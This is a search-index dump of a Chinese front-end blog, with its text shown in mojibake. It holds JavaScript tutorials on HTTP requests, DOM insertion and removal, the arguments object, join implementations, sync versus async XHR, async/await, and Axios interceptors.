url: `https://reqres.in/api/users`, form: { name: 'PeaNu', job: 'F2E' } }, // å›æ‡‰çš„å…§å®¹ (error, response, body) =&gt; console.log(body)) responseï¼š 1{\"name\":\"PeaNu\",\"job\":\"F2E\",\"id\":\"204\",\"createdAt\":\"2022-01-03T13:55:49.725Z\"} DELETEï¼š 12345678const request = require('request')// åˆªé™¤ users/2 çš„è³‡æ–™request.delete('https://reqres.in/api/users/2', (error, response, body) =&gt; { // å›æ‡‰çš„ç‹€æ…‹ç¢¼ console.log(response.statusCode) // å›æ‡‰çš„å…§å®¹ console.log('body:', body)}) responseï¼š 12204 // æˆåŠŸï¼Œä½†æˆ‘æ²’ä»€éº¼æƒ³è·Ÿä½ èªªçš„body: // æ‰€ä»¥ body æ‰æœƒæ˜¯ç©ºçš„ PATCHï¼š 1234567891011121314151617const request = require('request')// ä¿®æ”¹ users/2 çš„è³‡æ–™request.patch( { url: 'https://reqres.in/api/users/2', form: { name: 'PeaNu', job: 'F2E' } }, (error, response, body) =&gt; { // å›æ‡‰çš„ç‹€æ…‹ç¢¼ console.log(response.statusCode) // å›æ‡‰çš„å…§å®¹ console.log(body) }) responseï¼š 12200{\"name\":\"PeaNu\",\"job\":\"F2E\",\"updatedAt\":\"2022-01-04T06:33:38.211Z\"}","link":"/2022/01/04/api-practice/"},{"title":"ç”¨ DOM æ’å…¥æˆ–åˆªé™¤å…ƒç´ ","text":"åˆæ˜¯ä½ ï½ é‡é»ä¸è«–æ˜¯ã€Œæ–°å¢ã€æˆ–ã€Œåˆªé™¤ã€ï¼Œéƒ½å¿…é ˆé€éã€Œçˆ¶å…ƒç´ ã€ä¾†æ“ä½œã€‚ æ›å¥è©±èªªå°±æ˜¯ç›´æ¥å°å…ƒç´ ä½¿ç”¨çš„è©±æœƒå‡ºéŒ¯ï¼Œè«‹å‹™å¿…è¨˜ä½é€™ä¸€é»ã€‚ æ–°å¢å…ƒç´ æ’åˆ°æœ€å‰é¢ prependå‚™è¨»ï¼šå¦‚æœè¦æ–°å¢å¤šå€‹å¯ä»¥ prepand(elem1, elem2) 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 12345678// å…ˆé¸åˆ°è¦æ–°å¢å…ƒç´ çš„çˆ¶å±¤const parent = document.querySelector('.block')// å»ºç«‹æ–°å…ƒç´ const newElement = document.createElement('div')// å¯«ä¸€äº›æ–‡å­—newElement.innerText = 'R~Lo~Ha~'// æ’åˆ°æœ€å‰é¢parent.prepend(newElement) Outputï¼š 1234&lt;div class=\"block\"&gt; &lt;div&gt;R~Lo~Ha~&lt;/div&gt; yoyoyo&lt;/div&gt; æ’åˆ°æœ€å¾Œé¢ appendChild1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 12345678// å…ˆé¸åˆ°è¦æ–°å¢å…ƒç´ çš„çˆ¶å±¤const parent = document.querySelector('.block')// å»ºç«‹æ–°å…ƒç´ const newElement = document.createElement('div')// å¯«ä¸€äº›æ–‡å­—newElement.innerText = 'R~Lo~Ha~'// æ’åˆ°æœ€å¾Œé¢parent.appendChild(newElement) Outputï¼š 1234&lt;div class=\"block\"&gt; yoyoyo &lt;div&gt;R~Lo~Ha~&lt;/div&gt;&lt;/div&gt; ä¸€æ¬¡æ–°å¢å¤šå€‹å…ƒç´ çªç„¶ç™¼ç¾æœ‰å€‹ append æ–¹æ³•å¯ä»¥ç”¨ï¼š 123&lt;div class=\"block\"&gt; &lt;p&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 12345678910// å…ˆé¸åˆ°è¦åˆªé™¤å…ƒç´ çš„çˆ¶å±¤const parent = document.querySelector('.block')// è¦æ–°å¢çš„ç¬¬ä¸€å€‹å…ƒç´ const elem1 = document.createElement('div')elem1.innerText = 'elem1'// è¦æ–°å¢çš„ç¬¬äºŒå€‹å…ƒç´ const elem2 = document.createElement('div')elem2.innerText = 'elem2'// æ’å…¥å…©å€‹å…ƒç´ parent.append(elem1, elem2) Outputï¼š 12345&lt;div class=\"block\"&gt; &lt;p&gt;yoyoyo&lt;/p&gt; &lt;div&gt;elem1&lt;/div&gt; &lt;div&gt;elem2&lt;/div&gt;&lt;/div&gt; æ’åˆ°çˆ¶å…ƒç´ ä¸‹çš„æŸå€‹å­å…ƒç´ å‰é¢ insertBefore123&lt;div class=\"parent\"&gt; &lt;div class=\"child\"&gt;child2&lt;/div&gt;&lt;/div&gt; 123456// å»ºç«‹æ–°å…ƒç´ const div = document.createElement('div')// æ–°å…ƒç´ å…§å®¹div.innerText = 'child1'// æŠŠ div æ’åˆ° child å‰é¢document.querySelector('.parent').insertBefore(div, document.querySelector('.child')) Outputï¼š 1234&lt;div class=\"parent\"&gt; &lt;div&gt;child1&lt;/div&gt; &lt;div class=\"child\"&gt;child2&lt;/div&gt;&lt;/div&gt; åˆªé™¤å…ƒç´ æ–¹æ³•ä¸€ removeChild123&lt;div class=\"block\"&gt; &lt;p class=\"child\"&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 123456// å…ˆé¸åˆ°è¦åˆªé™¤å…ƒç´ çš„çˆ¶å±¤const parent = document.querySelector('.block')// è¦åˆªé™¤çš„å…ƒç´ const deleteElement = document.querySelector('.child')// åˆªé™¤å­å…ƒç´ parent.removeChild(deleteElement) Outputï¼š 1&lt;div class=\"block\"&gt;&lt;/div&gt; æ–¹æ³•äºŒ remove123&lt;div class=\"block\"&gt; &lt;p class=\"child\"&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; JavaScriptï¼š 1234// è¦åˆªé™¤çš„å…ƒç´ const deleteElement = document.querySelector('.child')// æŠŠè‡ªå·±åˆªé™¤deleteElement.remove() è£œå……ï¼æ–°å¢æ–‡å­—ç¯€é»å¦‚æœä½ åªæƒ³æ–°å¢æ–‡å­—ï¼Œä½†åˆä¸æƒ³ç”¨ innerTextï¼Œå› ç‚ºæœƒæ•´ç­†è¦†å¯«æ‰ã€‚ é€™æ™‚å€™ä½ å¯ä»¥æ”¹ç”¨ createTextNode ä¾†è™•ç†ï¼š 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 123456// å…ˆé¸åˆ°è¦æ–°å¢å…ƒç´ çš„çˆ¶å±¤const parent = document.querySelector('.block')// å»ºç«‹æ–°æ–‡å­—å…§å®¹const newText = document.createTextNode('a new text')// æ’åˆ°æœ€å¾Œé¢parent.appendChild(newText) Outputï¼š 1&lt;div class=\"block\"&gt;yoyoyo a new text&lt;/div&gt;","link":"/2022/01/18/append-or-delete-element/"},{"title":"å‡½å¼ä¸­çš„ arguments ç‰©ä»¶èˆ‡ Array-like Object","text":"Deja vu. é—œæ–¼ arguments ç‰©ä»¶æ¯ä¸€å€‹ function åŸ·è¡Œçš„æ™‚å€™éƒ½æœƒè¢«å‚³å…¥ä¸€å€‹ arguments å¼•æ•¸ï¼Œå®ƒæœƒå„²å­˜ä¸€äº›è·Ÿå¼•æ•¸æœ‰é—œçš„è³‡è¨Šï¼š 12345function add(a, b) { console.log(arguments) console.log(arguments[0] + arguments[1])}add(1, 10) è¼¸å‡ºï¼š 12[Arguments] { '0': 1, '1': 3 }11 é—œæ–¼ Array-like Objectä¸çŸ¥é“åœ¨å‰›å‰›ä½ æœ‰æ²’æœ‰æ³¨æ„åˆ° arguments å…¶å¯¦æ˜¯ä¸€å€‹ã€Œç‰©ä»¶ã€ï¼Œè€Œä¸æ˜¯é™£åˆ—ï¼ˆå„˜ç®¡çœ‹èµ·ä¾†å¾ˆåƒï¼‰ã€‚ arguments é‚„æœ‰å…¶ä»–çš„å±¬æ€§ï¼Œåƒæ˜¯ï¼š callee è¢« call çš„ function è‡ªå·± caller èª°ï¼ˆå“ªå€‹ç‰©ä»¶ï¼‰call é€™å€‹ function çš„ï¼Ÿ length ç„¶å¾Œä½ ä»”ç´°æƒ³æƒ³çœ‹ï¼Œå¦‚æœè¦ä½ ç”¨ã€Œé™£åˆ—ã€ä¾†å¯¦ä½œ arguments é€™å€‹æ±è¥¿ï¼Œæ‡‰è©²æœƒç¢°åˆ°ä¸€é»å•é¡Œï¼š 12345678910var arguments = [ '0': argument1 '1': argument2 .... 'length', 'caller', 'callee'] å¡ä½äº†å§ï¼Ÿå› ç‚ºè°æ˜çš„ä½ ä¹ŸçŸ¥é“é™£åˆ—åªèƒ½æŒ‡å®š valueï¼Œæ²’è¾¦æ³•åƒç‰©ä»¶ä¸€æ¨£åŒæ™‚æŒ‡å®š key è·Ÿ valueã€‚ å³ä¾¿ arguments è®“ä½ å¯ä»¥ç”¨ arguments[n] ä¾†å­˜å–å¼•æ•¸ï¼Œä½†ç‚ºäº†å„²å­˜é‚£äº›å…¶ä»–çš„è³‡è¨Šï¼Œé‚„æ˜¯åªèƒ½ç”¨ã€Œç‰©ä»¶ã€ä¾†å¯¦ä½œï¼Œåªæ˜¯è®“å®ƒæ„Ÿè¦ºå¾ˆåƒé™£åˆ—ç½·äº†ã€‚ é€™ç¨®é•·çš„å¾ˆåƒé™£åˆ—çš„ç‰©ä»¶å°±ç¨±ä½œã€ŒArray-like Objectã€ï¼ˆé‚„çœŸæ˜¯æœ‰å¤ äººæ€§åŒ–çš„å–åæ–¹å¼ï¼‰ Array-like-object çš„ç‰¹æ€§ å¯ä»¥ç”¨ for...of ä¾†å–å€¼ï¼ˆå› ç‚º iterableï¼‰ ä¸å¯ä»¥ç”¨ Array çš„å…§å»ºæ–¹æ³•ï¼Œä¾‹å¦‚ map()ã€‚å¿…é ˆå…ˆç”¨ Array.from() è½‰æˆé™£åˆ—æ‰å¯ä»¥ã€‚","link":"/2021/12/18/arguments-and-array-like-object/"},{"title":"å¯¦ä½œ join çš„ä¸‰ç¨®æ–¹æ³•","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œå› ç‚ºå¦å¤–å…©å€‹è§£æ³•å¾ˆæœ‰è¶£ï¼Œæ‰€ä»¥æƒ³ç‰¹åˆ¥è¨˜éŒ„ä¸€ä¸‹ã€‚ è§£æ³•ä¸€æ‡‰è©²å¤§éƒ¨åˆ†çš„äººéƒ½æ˜¯é€™æ¨£è§£çš„ =&gt; ç¢°åˆ°æœ€å¾Œä¸€å€‹å…ƒç´ æ™‚ï¼Œä¸åŠ ä¸Šåˆ†éš”å€¼ï¼š 12345678910111213141516function join(arr, separator) { let result = '' // éæ­·é™£åˆ—å…ƒç´  for(let i=0; i&lt;arr.length; i++) { // ä¸æ˜¯æœ€å¾Œä¸€å€‹å…ƒç´ æ‰æ’å€¼ if(i !== arr.length-1) { result += arr[i] + separator } else { // æœ€å¾Œä¸€å€‹å…ƒç´ ç›´æ¥å¡«å…¥ result += arr[i] } } // å›å‚³çµæœ return result}console.log(join(['1', '2', '3'], '!')) // 1!2!3 è§£æ³•äºŒå¦‚æœå…ˆæŠŠç¬¬ä¸€å€‹å…ƒç´ çµ¦æ’é™¤ï¼Œæœƒç™¼ç¾å¾Œé¢éƒ½æ˜¯åŒå€‹è¦å¾‹ =&gt; çœ‹æˆæ˜¯ 1 + !2 + !3ï¼š 123456789101112function join(arr, separator) { // å„²å­˜ç¬¬ä¸€å€‹å…ƒç´  let result = arr[0] // å¾ç¬¬äºŒå€‹å…ƒç´ é–‹å§‹å–å‡º for(let i=1; i&lt;arr.length; i++) { // åˆ†éš”å€¼ + æ–‡å­— result += separator + arr[i] } // å›å‚³çµæœ return result}console.log(join(['1', '2', '3'], '!')) // 1!2!3 è§£æ³•ä¸‰è·Ÿè§£æ³•äºŒçš„é‚è¼¯ä¸€æ¨£ï¼Œåªæ˜¯ç¾åœ¨è®Šæˆ =&gt; 1! + 2! + 3ï¼š 1234567891011function join(arr, separator) { let result = '' // è¨˜å¾— -1 æ’é™¤æœ€å¾Œä¸€å€‹å…ƒç´  for(let i=0; i&lt;arr.length-1; i++) { // æ–‡å­— + åˆ†éš”å€¼ result += arr[i] + separator } // è£œä¸Šæœ€å¾Œä¸€å€‹å…ƒç´ å€¼ return result + arr[arr.length-1]}console.log(join(['1', '2', '3'], '!')) // 1!2!3","link":"/2021/12/30/array-join-method/"},{"title":"å¾è¨­éŒ¯åƒæ•¸ä¾†å­¸ç¿’ async èˆ‡ sync çš„å·®ç•°","text":"çœŸçš„æœ‰å¤ é¬§ã€‚ ä¾†é¾å»è„ˆé€™å€‹éŒ¯èª¤æ˜¯ä¾†è‡ªã€Œç¨‹å¼å°å¸«å¯¦é©—è¨ˆç•«ç¬¬äº”æœŸã€week8 çš„é€²éšæŒ‘æˆ°é¡Œã€‚ åŸæœ¬æˆ‘æ˜¯æƒ³åšå‡ºã€Œæ¯æŠ“åˆ°ä¸€ç­†è³‡æ–™å°±æ›´æ–° DOM ä¾†é¡¯ç¤ºçå“æ•¸é‡ã€ï¼Œåƒé€™æ¨£ï¼š ä½†æˆ‘çŠ¯äº†ä¸€å€‹å¾ˆè ¢çš„éŒ¯èª¤ï¼Œå°±æ˜¯æŠŠ XMLHttpRequest.send() çš„ç¬¬ä¸‰å€‹åƒæ•¸ï¼ˆasyncï¼‰å¯«éŒ¯ï¼Œè®“æ¯ä¸€æ¬¡ request éƒ½è®Šæˆã€ŒåŒæ­¥ã€çš„ï¼Œæ‰€ä»¥å°±å¾—åˆ°äº†æ»¿æ»¿çš„ã€Œblockï¼ˆå µå¡ï¼‰ã€ï¼Œä¹Ÿé«”æœƒåˆ°äº† you canâ€™t do anything, because itâ€™s stuck. é€™å¥è©±çš„å…§æ¶µã€‚ åŸå§‹ç¢¼ï¼š ï¼ˆæœ‰èˆˆè¶£çš„äººå¯ä»¥ç›´æ¥è²¼åˆ° console å»è·‘è·‘çœ‹ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// æ¸¬è©¦ç”¨çš„æŒ‰éˆ•const button = document.querySelector('button')// åŠ ä¸Š click äº‹ä»¶ï¼Œå¦‚æœç™¼ç”Ÿ block å°±é»ä¸äº†button.addEventListener('click', () =&gt; console.log('click'))/* ä»¥ä¸‹æ˜¯ç™¼ request çš„æµç¨‹ total: ç¸½å…±è¦ç™¼å¹¾æ¬¡ request counter: ç´€éŒ„ç™¼äº†å¹¾æ¬¡ request ç•¶ counter &lt; total å°±æœƒç¹¼çºŒç™¼å‡º request*/let total = 1000let counter = 1function handler () { // counter + 1ï¼ˆæ›´æ–°ï¼‰ counter++ // æª¢æŸ¥å›å‚³è³‡æ–™ if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { const { prize, error=null } = JSON.parse(request.responseText) if (error) { console.log(error) } switch (prize) { case 'NONE': console.log(prize) break case 'FIRST': console.log(prize) break case 'SECOND': console.log(prize) break case 'THIRD': console.log(prize) break } } else { // ç™¼ç”Ÿæœªé æœŸçš„éŒ¯èª¤ console.log('500') } // æ²’æŠ“å¤ ï¼Œåœ¨ send ä¸€æ¬¡ request if (counter &lt;= total) { /* å•é¡Œå°±å‡ºåœ¨é€™è£¡ request.send() çš„ç¬¬ä¸‰å€‹åƒæ•¸ true: éåŒæ­¥åŸ·è¡Œ false: åŒæ­¥åŸ·è¡Œ */ request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', false ) // å› ç‚ºæ˜¯åŒæ­¥ï¼Œæ‰€ä»¥æœƒå¡åœ¨é€™è£¡ç­‰ request.send() }}const request = new XMLHttpRequest()request.addEventListener('load', handler)request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', false)// å› ç‚ºæ˜¯åŒæ­¥ï¼Œæ‰€ä»¥æœƒå¡åœ¨é€™è£¡ç­‰request.send()// ç­‰ä¸Šé¢å…¨éƒ¨åŸ·è¡Œå®Œï¼Œæ‰æœƒè·‘é€™ä¸€æ®µconsole.log('sync') è¼¸å‡ºï¼š å¯ä»¥æ³¨æ„åˆ° click è·Ÿ sync æœƒç­‰åˆ°ã€Œæ‰€æœ‰çš„ requestã€çµæŸå¾Œæ‰è¢«åŸ·è¡Œåˆ°ã€‚ ç•¶æ™‚ç‚ºäº†æ‰¾å‡ºåŸå› ï¼Œæˆ‘é‚„è©¦è‘—ç”¨ setTimeout ä¾†æ¨¡æ“¬ä¸€æ®µéåŒæ­¥æ“ä½œã€‚ åŸå§‹ç¢¼ï¼š 123456789101112131415161718/* ä»¥ä¸‹æœƒæ˜¯æ¯ä¸€æ¬¡çš„ callback (handler) å»å‘¼å«ä¸‹ä¸€å€‹ setTimeout ä¸¦ä¸”æŠŠç›®å‰çš„æ•¸å­—é¡¯ç¤ºåˆ° DOM å…ƒç´ ä¸Š æœƒå¾ 1 è·‘åˆ° 1000 ç‚ºæ­¢*/let total = 1000let counter = 1function handler () { // æ›´æ–° DOM å…ƒç´ å…§å®¹ div.innerText = counter++ // é‚„æ²’ 1000 æ¬¡å°±åœ¨å‘¼å«ä¸€æ¬¡ setTimeout if (counter &lt;= total) { setTimeout(handler, 100) }}// ç¬¬ä¸€æ¬¡åŸ·è¡Œ setTimeoutsetTimeout(handler, 100) è¼¸å‡ºï¼š é€™ä¸‹æˆ‘æ›´äº‚äº†ï¼Œæ˜æ˜å…©å€‹çš„é‚è¼¯æ˜¯ä¸€æ¨£çš„å»æœ‰ä¸åŒçš„è¡Œç‚ºï¼Ÿ å¾Œä¾†æˆ‘è©¦è‘—ç”¨ debugger ä¾†çœ‹åˆ°åº•å“ªè£¡å‡ºäº†å•é¡Œï¼Œä½†é‚„æ˜¯æ²’æ‰¾å‡ºä¾†ã€‚ç›´åˆ°æœ€å¾Œåœ¨ starkoverflow çš„ XMLHttpRequest in for loop æ‰ç™¼ç¾ï¼š é åŒ—ï¼ŒåŸä¾†æ˜¯æˆ‘å¯«éŒ¯åƒæ•¸ã€‚ æ‰€ä»¥æŠŠåªè¦æŠŠåƒæ•¸æ”¹æ‰ï¼Œä¸€åˆ‡å°±æ­£å¸¸äº†ï¼š åŸå§‹ç¢¼ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// æ¸¬è©¦ç”¨çš„æŒ‰éˆ•const button = document.querySelector('button')// åŠ ä¸Š click äº‹ä»¶ï¼Œå¦‚æœç™¼ç”Ÿ block å°±é»ä¸äº†button.addEventListener('click', () =&gt; console.log('click'))/* ä»¥ä¸‹æ˜¯ç™¼ request çš„æµç¨‹ total: ç¸½å…±è¦ç™¼å¹¾æ¬¡ request counter: ç´€éŒ„ç™¼äº†å¹¾æ¬¡ request ç•¶ counter &lt; total å°±æœƒç¹¼çºŒç™¼å‡º request*/let total = 1000let counter = 1function handler () { // counter + 1ï¼ˆæ›´æ–°ï¼‰ counter++ // æª¢æŸ¥å›å‚³è³‡æ–™ if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { const { prize, error=null } = JSON.parse(request.responseText) if (error) { console.log(error) } switch (prize) { case 'NONE': console.log(prize) break case 'FIRST': console.log(prize) break case 'SECOND': console.log(prize) break case 'THIRD': console.log(prize) break } } else { // ç™¼ç”Ÿæœªé æœŸçš„éŒ¯èª¤ console.log('500') } // æ²’æŠ“å¤ ï¼Œåœ¨ send ä¸€æ¬¡ request if (counter &lt;= total) { /* å•é¡Œå°±å‡ºåœ¨é€™è£¡ request.send() çš„ç¬¬ä¸‰å€‹åƒæ•¸ true: éåŒæ­¥åŸ·è¡Œ false: åŒæ­¥åŸ·è¡Œ */ request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', true ) // éåŒæ­¥åŸ·è¡Œï¼Œæœƒæ¥è‘—è·‘ä¸‹é¢çš„ç¨‹å¼ç¢¼ request.send() }}const request = new XMLHttpRequest()request.addEventListener('load', handler)/* å•é¡Œå°±å‡ºåœ¨é€™è£¡ request.send() çš„ç¬¬ä¸‰å€‹åƒæ•¸ true: éåŒæ­¥åŸ·è¡Œ false: åŒæ­¥åŸ·è¡Œ*/request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', true)// éåŒæ­¥åŸ·è¡Œï¼Œæœƒæ¥è‘—è·‘ä¸‹é¢çš„ç¨‹å¼ç¢¼request.send()// ä¸Šé¢è¢« call å®Œå¾Œé¦¬ä¸Šè·‘é€™ä¸€æ®µconsole.log('sync') è¼¸å‡ºï¼š ç¾åœ¨ä¸€é–‹å§‹ sync å°±æœƒè¢«åŸ·è¡Œï¼Œè€Œä¸” click ä¹Ÿèƒ½æ­£å¸¸åŸ·è¡Œï¼Œä¸æœƒæœ‰åƒå‰›å‰›ã€Œblockã€çš„æƒ…æ³ç™¼ç”Ÿã€‚ å¾Œè¨˜é›–ç„¶æäº†å ´çƒé¾ï¼Œä½†æˆ‘å€‘å¯ä»¥å¾ä¸­å­¸åˆ°ä¸€é»æ±è¥¿ï¼Œå› æ­¤æˆ‘èŠ±äº†äº›æ™‚é–“ä¾†åˆ†æé€™å…©è€…å¯¦éš›ä¸Šçš„åŸ·è¡Œæµç¨‹ã€‚ åœ¨åŒæ­¥çš„æƒ…æ³æ™‚ï¼š ç°¡å–®ä¾†èªªï¼Œç”¨ä¾†è™•ç† response çš„ handler éƒ½æœƒå»åŸ·è¡Œä¸‹ä¸€å€‹ requestï¼šrequest.send() æ‰€ä»¥ç¬¬ä¸€å€‹ request.send æœƒä¸€ç›´ç­‰ä¸€ç›´ç­‰ï¼Œç­‰åˆ°æœ€å¾Œçš„ request è¢«è§£æ±ºå®Œï¼Œåœ¨ã€Œéè¿´ã€åˆ°æœ€ä¸€é–‹å§‹çš„åŸé»ã€‚ä½†æ˜¯åœ¨é‚£ä¹‹å‰æœƒå…ˆå¾—åˆ° Maximum call stack çš„éŒ¯èª¤ã€‚ï¼ˆä½”å¤ªå¤šç©ºé–“å•¦ï¼‰ åœ¨éåŒæ­¥çš„æƒ…æ³æ™‚ï¼š é€™è£¡æœ€å¤§çš„ç‰¹é»æ˜¯ï¼Œæ¯ç•¶ Call stack ä¸­åŸ·è¡Œåˆ°ã€ŒéåŒæ­¥ã€æ™‚ï¼Œå°±æœƒåƒåœ–ä¸­é‚£æ¨£ç›´æ¥ä¸Ÿåˆ°ã€ŒWeb APIã€è®“ç€è¦½å™¨å»è™•ç†ï¼Œæ­¤æ™‚ Call stack å°±ã€Œç©ºå‡ºä½ç½®ã€èƒ½å¤ åŸ·è¡Œå…¶ä»–çš„ç¨‹å¼ç¢¼ã€‚ï¼ˆé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ sync è·Ÿ click å¯ä»¥æ­£å¸¸åŸ·è¡Œï¼‰ å¦å¤–æ¯ä¸€æ¬¡ handler åœ¨åŸ·è¡Œä¸‹ä¸€å€‹ request çš„æ™‚å€™ï¼Œå› ç‚ºæ˜¯éåŒæ­¥ï¼Œæ‰€ä»¥ request æœƒç›´æ¥è¢«ä¸Ÿåˆ° Web API è™•ç†ï¼Œè€Œ handler å°±åŸ·è¡ŒçµæŸäº†ï¼Œä¸æœƒåƒåŒæ­¥çš„æƒ…æ³ä¸€ç›´ã€Œå †ç–Šã€ã€‚","link":"/2022/01/26/asyn-and-sync-fool-mistake/"},{"title":"async await èƒŒå¾Œçš„åŸç†","text":"æŠŠä»¥å‰çš„èª¤è§£çµ¦é‡æ¸…ã€‚ ç°¡è¿°é¦–å…ˆ async å’Œ await æ˜¯ä¸€å€‹ ES7 æ¨å‡ºçš„èªæ³•ç³–ï¼Œè®“ä½ å¯ä»¥ç”¨å¾ˆåƒåŒæ­¥çš„æ–¹å¼ä¾†å¯«è™•ç†éåŒæ­¥ã€‚ç¯„ä¾‹å¯ä»¥åƒè€ƒæˆ‘ä»¥å‰å¯«çš„æ–‡ç« ï¼šPromise çš„å°æŠ€å·§ ç¸½ä¹‹å†å¼·èª¿ä¸€æ¬¡ï¼Œasync å’Œ await åªæ˜¯ã€Œçœ‹èµ·ä¾†å¾ˆåƒåŒæ­¥ã€ï¼Œä½†èƒŒå¾Œä¸€æ¨£æ˜¯éåŒæ­¥ã€‚ æ ¹æ“šæˆ‘åœ¨ç¶²è·¯ä¸Šæ‰¾çš„è³‡æ–™æ˜¯èªªï¼Œå…¶å¯¦èƒŒå¾Œä¹Ÿæ˜¯ç”¨ Promise åŒ…è£èµ·ä¾†ï¼Œä¹Ÿå› ç‚ºé€™å€‹åŸå›  await ä¸€å®šè¦æ”¾åœ¨ async function è£¡æ‰èƒ½é‹ä½œã€‚ æ‰€ä»¥æˆ‘å¯«äº†ä¸€æ®µå°æ‡‰çš„ç¨‹å¼ç¢¼ï¼Œå¯ä»¥æ¯”è¼ƒä¸€ä¸‹å·®ç•°ã€‚ async çš„å¯«æ³• 1234567891011121314151617181920// åŒ…è£ xhrconst getData = (url) =&gt; { return new Promise(resolve =&gt; { const request = new XMLHttpRequest(); request.open('GET', api200, true); request.onload = () =&gt; { resolve(JSON.parse(request.responseText)) }; request.send(); })}// async / awaitconst sendAllRequestByAsync = async () =&gt; { const data1 = await getData(api200) console.log('1', data1); const data2 = await getData(api200) console.log('2', data2); const data3 = await getData(api200) console.log('3', data3);} Promise çš„å¯«æ³• 123456789101112131415161718192021222324252627282930// åŒ…è£ xhrconst getData = (url) =&gt; { return new Promise(resolve =&gt; { const request = new XMLHttpRequest(); request.open('GET', api200, true); request.onload = () =&gt; { resolve(JSON.parse(request.responseText)) }; request.send(); })}// Promiseconst sendAllRequestByPromise = () =&gt; { getData(api200) .then(data =&gt; { const data1 = data console.log('1', data1) return getData(api200) }) .then(data =&gt; { const data2 = data console.log('2', data2) return getData(api200) }) .then(data =&gt; { const data3 = data console.log('3', data3) return getData(api200) })}","link":"/2022/03/03/async-and-await-principle/"},{"title":"åˆ©ç”¨ Axios ä¾†å°è£ API","text":"é‚„è »ä¸éŒ¯çš„æƒ³æ³•ã€‚ ç°¡è¿°ä»¥å‰å› ç‚ºæˆ‘ç¸½èªç‚º Axios æ˜¯å€‹æœ‰é»å¤šé¤˜çš„ libraryï¼Œå› ç‚ºä¸éå°±æ˜¯æŠŠ fetch åŒ…è£æˆ axios.get æˆ– axios.post è€Œå·²ï¼Œé‚£å¹¹å˜›ä¸ç›´æ¥ fetch å°±å¥½äº†ï¼Ÿ ä½†ä¸€ç›´åˆ°æœ€è¿‘æ‰ç™¼ç¾åŸä¾†æœ‰ Axios æœ‰æä¾› instanceï¼ˆå¯¦é«”ï¼‰çš„åŠŸèƒ½ä¾†è®“ä½ æ–¹ä¾¿ç®¡ç† APIã€‚å¯¦éš›ç”¨éä»¥å¾Œè¦ºå¾—é‚„ä¸éŒ¯ï¼Œæ‰€ä»¥ä¾†åšå€‹ç´€éŒ„ã€‚ å‰ç½®ä½œæ¥­ç­‰ä¸€ä¸‹æœƒæåˆ°å¹¾å€‹æ±è¥¿ï¼š axios.create() ç”¨ä¾†å»ºç«‹ instance instance.interceptors æ””æˆªå™¨ï¼Œç”¨ä¾†è™•ç†ç™¼å‡º req ä¹‹å‰å’Œæ‹¿åˆ° res ä¹‹å‰è¦åšçš„äº‹ æ¥è‘—ä¾†é‚Šçœ‹ code é‚Šè§£é‡‹ã€‚ é¦–å…ˆæœƒå…ˆå»ºç«‹ä¸€å€‹ axios çš„å¯¦é«”ï¼š é™„è¨»ï¼šé€™é‚Šç”¨çš„æ¸¬è©¦ API æ˜¯é€™æ”¯ã€‚ 1234567const instance = axios.create({ // ä¹‹å¾Œç™¼ req æ™‚å°±èƒ½å¯«ç›¸å°è·¯å¾‘ï¼Œä¾‹å¦‚ï¼š /users/1 baseURL: \"https://reqres.in/api/\", headers: { 'Content-Type': 'application/json' }, // è¶…éå¹¾ ms å°±ç®—å¤±æ•— timeout: 20000}) å»ºç«‹å¥½ä»¥å¾Œå®ƒå°±è·Ÿä¸€èˆ¬çš„ axios ä¸€æ¨£ï¼Œå¯ä»¥ç”¨ instance.get instance.post ä¹‹é¡çš„æ–¹æ³•ï¼Œä¸éåœ¨é‚£ä¹‹å‰æˆ‘å€‘æœƒå…ˆè¨­å®šã€Œæ””æˆªå™¨ï¼ˆinterceptorsï¼‰ã€ã€‚ æ””æˆªå™¨å°±æ˜¯è®“ä½ è¨­å®šï¼š request ç™¼å‡ºå»ä»¥å‰æˆ‘æƒ³åšä»€éº¼äº‹ï¼Ÿ response æ‹¿åˆ°ä»¥å¾Œï¼ŒæŠŠå€¼å›å‚³çµ¦å…¶ä»– handler ä»¥å‰è¦åšä»€éº¼ï¼Ÿ æ‰€ä»¥ request çš„éƒ¨åˆ†æœƒé€™æ¨£è¨­å®šï¼š 12345678910111213// ç¬¬ä¸€å€‹ function æœƒæ‹¿åˆ° config// ç¬¬äºŒå€‹ function æœƒæ‹¿åˆ° errorï¼ˆç™¼ç”ŸéŒ¯èª¤æ™‚ï¼‰instance.interceptors.request.use( function (config) { // å¯ä»¥åœ¨é€™è£¡ä¿®æ”¹ config // é€™é‚Šåªæ˜¯éš¨ä¾¿ç¤ºç¯„ï¼Œä¾‹å¦‚åœ¨é€™åŠ ä¸Š Auth token header config.headers.Authorization = 'Bearer 12345'; return config; }, function (err) { return Promise.reject(err); }) è€Œ response çš„éƒ¨åˆ†é€šå¸¸æœƒè‘—é‡åœ¨éŒ¯èª¤è™•ç†ï¼š 12345678910111213141516171819202122232425262728instance.interceptors.response.use( // æˆåŠŸçš„è™•ç† function (res) { // å¦‚æœæƒ³åšäº›äº‹æƒ…å¯ä»¥åœ¨é€™è£¡åš return res; }, // å¤±æ•—çš„è™•ç† function (err) { if (err.response) { switch (err.response.status) { case 404: console.log('ä¸å­˜åœ¨'); // å°å‘ 404 é é¢ break case 500: console.log('ä¼ºæœå™¨éŒ¯èª¤'); break default: console.log(err.message); } } if (!window.navigator.onLine) { alert(\"ä½ ç¶²è·¯æœ‰å•é¡Œå“¦ï¼\") return } return Promise.reject(err) }) 